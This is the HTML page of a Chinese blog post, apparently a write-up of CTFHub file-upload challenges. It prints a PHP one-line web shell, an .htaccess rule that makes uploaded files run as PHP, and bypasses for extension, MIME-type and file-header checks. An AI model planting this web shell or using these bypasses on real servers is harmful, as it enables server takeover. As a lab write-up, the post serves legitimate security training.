@@ -1,0 +1,506 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="文件上传 被茯苓夸奖了 于是来做做 (之前还真没做到这儿)   无验证​    一进入便看到这样的界面 ​    既然无限制, 肯定就选择最好用的一句话木马, 上传 get.php , 内容如下 : 1&lt;?php @eval($_POST[&quot;shell&quot;]); ?&gt;  ​    解释一下   ‘ @ ‘ 代表后面的操作即使运行错误也不报错, 不然报错了立刻被发现还能">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfhub技能树 之 文件上传">
+<meta property="og:url" content="http://example.com/2021/11/02/ctfhub%E6%8A%80%E8%83%BD%E6%A0%91/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="文件上传 被茯苓夸奖了 于是来做做 (之前还真没做到这儿)   无验证​    一进入便看到这样的界面 ​    既然无限制, 肯定就选择最好用的一句话木马, 上传 get.php , 内容如下 : 1&lt;?php @eval($_POST[&quot;shell&quot;]); ?&gt;  ​    解释一下   ‘ @ ‘ 代表后面的操作即使运行错误也不报错, 不然报错了立刻被发现还能">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dianzzz/dzimg/data/image-20211102170907976.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dianzzz/dzimg/data/image-20211102165343319.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dianzzz/dzimg/data/image-20211102170228434.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dianzzz/dzimg/data/image-20211102170440802.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dianzzz/dzimg/data/image-20211102171054972.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dianzzz/dzimg/data/image-20211102174146329.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dianzzz/dzimg/data/image-20211102203123593.png">
+<meta property="article:published_time" content="2021-11-02T08:48:16.000Z">
+<meta property="article:modified_time" content="2021-11-03T06:26:34.717Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/dianzzz/dzimg/data/image-20211102170907976.png">
+
+<link rel="canonical" href="http://example.com/2021/11/02/ctfhub%E6%8A%80%E8%83%BD%E6%A0%91/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>ctfhub技能树 之 文件上传 | Hexo</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Hexo</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/02/ctfhub%E6%8A%80%E8%83%BD%E6%A0%91/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ctfhub技能树 之 文件上传
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-11-02 16:48:16" itemprop="dateCreated datePublished" datetime="2021-11-02T16:48:16+08:00">2021-11-02</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-11-03 14:26:34" itemprop="dateModified" datetime="2021-11-03T14:26:34+08:00">2021-11-03</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><blockquote>
+<p>被茯苓夸奖了<img src="https://cdn.jsdelivr.net/gh/dianzzz/dzimg/data/image-20211102170907976.png" alt="image-20211102170907976"> 于是来做做 (之前还真没做到这儿)</p>
+</blockquote>
+<hr>
+<h3 id="无验证"><a href="#无验证" class="headerlink" title="无验证"></a>无验证</h3><p>​    一进入便看到这样的界面<img src="https://cdn.jsdelivr.net/gh/dianzzz/dzimg/data/image-20211102165343319.png" alt="image-20211102165343319"></p>
+<p>​    既然无限制, 肯定就选择最好用的一句话木马, 上传 <em>get.php</em> , 内容如下 :</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;shell&quot;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>​    解释一下</p>
+<ul>
+<li> ‘ <em>@</em> ‘ 代表后面的操作即使运行错误也不报错, 不然报错了立刻被发现还能叫什么木马?</li>
+<li>‘ <em>eval</em>() ‘ 函数中括号内的字符串全部当作代码执行</li>
+<li>‘ <em>$__POST[‘shell’]</em> ‘ 以post方法获取变量 ‘ shell’ ‘ 的值</li>
+</ul>
+<p>​    上传完之后如图 :<img src="https://cdn.jsdelivr.net/gh/dianzzz/dzimg/data/image-20211102170228434.png" alt="image-20211102170228434">  连路径都给好了, 属实是良心题了</p>
+<p>​    然后连接中国蚁剑, 测试连接</p>
+<p><img src="https://cdn.jsdelivr.net/gh/dianzzz/dzimg/data/image-20211102170440802.png" alt="image-20211102170440802"></p>
+<p>​    连接成功, 点进去在 <em>html</em> 文件夹下就能找到 flag 了</p>
+<hr>
+<h3 id="前端验证"><a href="#前端验证" class="headerlink" title="前端验证"></a>前端验证</h3><h4 id="JS验证"><a href="#JS验证" class="headerlink" title="JS验证"></a>JS验证</h4><p>​    打开后看到 <img src="https://cdn.jsdelivr.net/gh/dianzzz/dzimg/data/image-20211102171054972.png" alt="image-20211102171054972"></p>
+<p>​    查看源码</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>CTFHub 文件上传 - js前端验证<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>CTFHub 文件上传 - js前端验证<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span> <span class="attr">onsubmit</span>=<span class="string">&quot;return checkfilesuffix()&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>Filename:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">checkfilesuffix</span>(<span class="params"></span>)</span></span></span><br><span class="line"><span class="function"><span class="javascript"></span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> file=<span class="built_in">document</span>.getElementsByName(<span class="string">&#x27;file&#x27;</span>)[<span class="number">0</span>][<span class="string">&#x27;value&#x27;</span>];</span></span><br><span class="line"><span class="javascript">    <span class="keyword">if</span>(file==<span class="string">&quot;&quot;</span>||file==<span class="literal">null</span>)</span></span><br><span class="line"><span class="javascript">    &#123;</span></span><br><span class="line"><span class="javascript">        alert(<span class="string">&quot;请添加上传文件&quot;</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">else</span></span></span><br><span class="line"><span class="javascript">    &#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> whitelist=<span class="keyword">new</span> <span class="built_in">Array</span>(<span class="string">&quot;.jpg&quot;</span>,<span class="string">&quot;.png&quot;</span>,<span class="string">&quot;.gif&quot;</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> file_suffix=file.substring(file.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span>(whitelist.indexOf(file_suffix) == -<span class="number">1</span>)</span></span><br><span class="line"><span class="javascript">        &#123;</span></span><br><span class="line"><span class="javascript">            alert(<span class="string">&quot;该文件不允许上传&quot;</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>​    </p>
+<p>​    发现只允许上传 <em>.jpg</em> <em>.gif</em> 和 <em>.png</em> 文件, 但是验证只存在于前端, 在网安中有这么一句话, <em><strong>位于客户端的数据输入校验都是可以绕过的</strong></em> . 有两种方法可以绕过 JS验证</p>
+<ol>
+<li> 禁用 JS</li>
+</ol>
+<p>   在设置中禁用Javascript后, 刷新界面,便能够上传了</p>
+<ol start="2">
+<li> 将 <em>get.php</em> 的后缀名改为其中的任意一个后上传, 同时使用 Burp 抓包, 看到如下页面</li>
+</ol>
+<p>   <img src="https://cdn.jsdelivr.net/gh/dianzzz/dzimg/data/image-20211102174146329.png" alt="image-20211102174146329"> </p>
+<p>   将 <strong>第18行</strong> 的 <em>filename=”get.<strong>jpg</strong>“</em> 改为 <em>filename=”get.<strong>php</strong>“</em> , 然后发送, 便能成功上传了</p>
+<p>   上传成功后连蚁剑就完事了</p>
+<hr>
+<h4 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h4><blockquote>
+<p>htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能                                                                                     – From 题目</p>
+</blockquote>
+<p>​    还没开, 先看看提示, 发现有一个改变文件扩展名, 是否能从这里下手呢? </p>
+<p>​    多的不说, 先看源码</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>CTFHub 文件上传 - htaccess<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>CTFHub 文件上传 - htaccess<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>Filename:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">if (!empty($_POST[&#x27;submit&#x27;])) &#123;</span></span><br><span class="line"><span class="comment">    $name = basename($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]);</span></span><br><span class="line"><span class="comment">    $ext = pathinfo($name)[&#x27;extension&#x27;];</span></span><br><span class="line"><span class="comment">    $blacklist = array(&quot;php&quot;, &quot;php7&quot;, &quot;php5&quot;, &quot;php4&quot;, &quot;php3&quot;, &quot;phtml&quot;, &quot;pht&quot;, &quot;jsp&quot;, &quot;jspa&quot;, &quot;jspx&quot;, &quot;jsw&quot;, &quot;jsv&quot;, &quot;jspf&quot;, &quot;jtml&quot;, &quot;asp&quot;, &quot;aspx&quot;, &quot;asa&quot;, &quot;asax&quot;, &quot;ascx&quot;, &quot;ashx&quot;, &quot;asmx&quot;, &quot;cer&quot;, &quot;swf&quot;);</span></span><br><span class="line"><span class="comment">    if (!in_array($ext, $blacklist)) &#123;</span></span><br><span class="line"><span class="comment">        if (move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], UPLOAD_PATH . $name)) &#123;</span></span><br><span class="line"><span class="comment">            echo &quot;&lt;script&gt;alert(&#x27;上传成功&#x27;)&lt;/script&gt;&quot;;</span></span><br><span class="line"><span class="comment">            echo &quot;上传文件相对路径&lt;br&gt;&quot; . UPLOAD_URL_PATH . $name;</span></span><br><span class="line"><span class="comment">        &#125; else &#123;</span></span><br><span class="line"><span class="comment">            echo &quot;&lt;script&gt;alert(&#x27;上传失败&#x27;)&lt;/script&gt;&quot;;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125; else &#123;</span></span><br><span class="line"><span class="comment">        echo &quot;&lt;script&gt;alert(&#x27;文件类型不匹配&#x27;)&lt;/script&gt;&quot;;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>​    看到有一个黑名单, 头铁继续传 <em>get.php</em> 试试, 发现提示 <em>“文件类型不匹配”</em> ,必须想别的方法</p>
+<p>​    搜了下发现一个好玩的, <a target="_blank" rel="noopener" href="https://blog.csdn.net/shana_8/article/details/104827642">.htaccess 文件上传漏洞</a> ,概括一下就是可以自己写一个 <em>.htaccess</em> 文件来自定义解析规则</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> &quot;<span class="attr">get</span>&quot;&gt;</span></span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>其作用为: 当上传的文件的名字中有 <strong>“ get “</strong> 时,将该文件以php来解析, 那么思路就是先传一个 <em>.htaccess</em> 文件然后传 <em>get.jpg</em> ,最后连蚁剑, 完事儿收工  <del>吃饭去了回来再写</del></p>
+<hr>
+<h4 id="MIME绕过"><a href="#MIME绕过" class="headerlink" title="MIME绕过"></a>MIME绕过</h4><p>​    这回的源码就没啥可看的了, 就不放出来了</p>
+<p>​    <strong>MIME是个啥</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。</span><br><span class="line">是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。</span><br></pre></td></tr></table></figure>
+
+<p>​    说人话就是为某种文件设置默认打开程序, 常见的 MIME 类型如下</p>
+<ol>
+<li><p>text/plain (纯文本)</p>
+</li>
+<li><p>text/html ( HTML 文档)</p>
+</li>
+<li><p>text/javascript ( js 代码)</p>
+</li>
+<li><p>application/xhtml+xml ( XHTML 文档)</p>
+</li>
+<li><p>image/gif ( GIF 图像)</p>
+</li>
+<li><p>image/jpeg ( JPEG 图像)</p>
+</li>
+<li><p>image/png ( PNG 图像)</p>
+</li>
+<li><p>video/mpeg ( MPEG 动画)</p>
+</li>
+<li><p>application/octet-stream (二进制数据)</p>
+</li>
+<li><p>application/pdf ( PDF 文档)</p>
+<p><strong>绕过原理</strong>     <del>大黑客来辣</del></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">部分Web应用系统判定文件类型是通过content-type字段，黑客可以通过抓包，将content-type字段改为常见的图片类型，如image/gif，从而绕过校验。</span><br></pre></td></tr></table></figure>
+
+<p>​    就是 burp 抓抓包然后改改重发就彳亍</p>
+<p><em><strong>回到题目来</strong></em></p>
+<p>​    先试了试直接传 <em>.php</em> ,意料之中的寄了, 然后随便传了一张流汗黄豆能行, 所以就可以将类型改为 <em>image/jpge</em> 来绕过</p>
+<p>​    burp 抓包获得如下信息 </p>
+<p><img src="https://cdn.jsdelivr.net/gh/dianzzz/dzimg/data/image-20211102203123593.png" alt="image-20211102203123593"> </p>
+<p>​    改变 <strong>第19行</strong> 就能成事儿 ,然后就是连连看了</p>
+</li>
+</ol>
+<hr>
+<h4 id="文件头检查"><a href="#文件头检查" class="headerlink" title="文件头检查"></a>文件头检查</h4><p>​    源码看不如不看, skip</p>
+<p>​    国际惯例, 莽传一手. 情理之中的没有传上去, 提示:</p>
+<blockquote>
+<p>文件类型不正确, 只允许上传 jpeg jpg png gif 类型的文件</p>
+</blockquote>
+<p>​    试试传完改名, 不得行, 提示文件错误, 再加上题目名字, 应该是要改改名, 去搜了搜发现还挺有意思的</p>
+<p>​    首先, 后端代码大概是这样的: </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$allow_mime</span> = <span class="keyword">array</span>(<span class="string">&quot;image/gif&quot;</span>, <span class="string">&quot;image/png&quot;</span>, <span class="string">&quot;image/jpeg&quot;</span>);</span><br><span class="line"><span class="variable">$imageinfo</span> = getimagesize(<span class="variable">$_FILES</span>[<span class="string">&quot;myfile&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line"><span class="variable">$path</span> = <span class="string">&quot;./uploads&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!in_array(<span class="variable">$imageinfo</span>[<span class="string">&#x27;mime&#x27;</span>], <span class="variable">$allow_mime</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;File type error!&lt;br&gt;&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$path</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;myfile&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&quot;myfile&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$file</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;Success!&lt;br&gt;&#x27;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;Error!&lt;br&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>​    这种使用 <strong>getimagesize()</strong> 的检查是通过检测图片的十六进制文件头来判断文件类型的, 思路就是burp抓包之后在hex里面改改, 下面贴一下常见的图片文件头</p>
+<blockquote>
+<p>gif (GIF89a) : 47 49 46 38 </p>
+<p>jpg jpeg : FF D8 FF</p>
+<p>png : 89 50 4E 47 </p>
+</blockquote>
+<p>​    <strong>完整过程</strong>: 先用 <em>010Editor</em> 把 <em>attack.php</em> 的头加点东西, 识别成png格式, 然后再把后缀名改成 <em>.php</em> 上传, burp抓包把后缀改回 <em>.php</em>, 然后蚁剑上</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/10/31/2021%E4%B8%9C%E5%8D%8E%E6%9D%AFWP/" rel="prev" title="2021东华杯WP">
+      <i class="fa fa-chevron-left"></i> 2021东华杯WP
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/11/03/JS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="next" title="JS学习笔记">
+      JS学习笔记 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
